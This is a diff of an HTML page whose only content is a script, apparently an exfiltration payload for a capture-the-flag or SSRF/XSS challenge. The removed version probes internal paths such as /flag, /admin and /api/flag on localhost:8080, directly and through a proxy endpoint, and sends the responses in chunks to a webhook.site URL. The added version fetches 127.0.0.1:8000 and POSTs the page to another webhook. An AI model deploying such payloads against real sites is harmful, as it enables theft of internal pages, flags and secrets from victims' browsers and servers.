@@ -6,78 +6,24 @@
 <body>
 <script>
 
-const webhook = "https://4e90327a-cdd5-4e84-927c-3ff613c76be0.webhook.site";
-
-const paths = [
-"/postcard-from-nyc",
-"/flag",
-"/",
-"/admin",
-"/debug",
-"/save",
-"/view",
-"/api",
-"/api/flag",
-"/api/debug"
-];
-
-function sendHTML(tag, html){
-
-  fetch(webhook + "/len?src=" + tag + "&l=" + html.length);
-
-  const chunk = 400;
-
-  for(let i=0;i<html.length;i+=chunk){
-    const part = html.slice(i,i+chunk);
-    fetch(webhook + "/html?src=" + tag + "&i=" + i + "&d=" + encodeURIComponent(part));
-  }
-
-}
-
-function debug(tag, r){
-  fetch(webhook + "/status?src=" + tag + "&s=" + r.status);
-  fetch(webhook + "/type?src=" + tag + "&t=" + r.type);
-  fetch(webhook + "/url?src=" + tag + "&u=" + encodeURIComponent(r.url));
-}
-
-paths.forEach(p=>{
-
-  const url = "http://localhost:8080" + p;
-
-  const proxy =
-  "http://localhost:8080/proxy?url=" +
-  encodeURIComponent(url);
-
-  fetch(proxy)
-  .then(async r=>{
-
-    debug("proxy"+p,r);
-
-    const html = await r.text();
-    sendHTML("proxy"+p,html);
-
+fetch('http://127.0.0.1:8000')
+  .then(response => response.text())
+  .then(html => {
+    // Send the HTML to a webhook
+    return fetch('https://20c77f7e-26f0-4929-ac86-63e0c1a31a0e.webhook.site', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'text/plain',
+      },
+      body: html
+    });
   })
-  .catch(e=>{
-    fetch(webhook + "/err?src=proxy"+p+"&e=" + encodeURIComponent(e));
-  });
-
-
-  fetch(url)
-  .then(async r=>{
-
-    debug("direct"+p,r);
-
-    const html = await r.text();
-    sendHTML("direct"+p,html);
-
+  .then(response => {
+    console.log('HTML sent to webhook successfully');
   })
-  .catch(e=>{
-    fetch(webhook + "/err?src=direct"+p+"&e=" + encodeURIComponent(e));
+  .catch(error => {
+    console.error('Error:', error);
   });
-
-});
-
-
 </script>
 </body>
 </html>
